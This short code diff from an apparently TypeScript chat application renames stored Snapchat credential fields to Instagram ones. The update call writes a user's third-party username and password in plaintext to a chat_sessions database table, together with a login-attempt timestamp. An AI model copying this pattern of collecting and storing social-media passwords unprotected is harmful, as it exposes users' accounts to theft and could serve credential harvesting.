@@ -27,8 +27,8 @@ export interface ChatSession {
   created_at: string;
   has_summary: boolean;
   summary: string | null;
-  snapchat_username?: string;
-  snapchat_password?: string;
+  instagram_username?: string;
+  instagram_password?: string;
   login_attempted_at?: string;
 }
 
@@ -248,8 +248,8 @@ export const chatService = {
       const { error } = await supabase
         .from('chat_sessions')
         .update({ 
-          snapchat_username: username,
-          snapchat_password: password,
+          instagram_username: username,
+          instagram_password: password,
           login_attempted_at: new Date().toISOString()
         })
         .eq('id', sessionId);
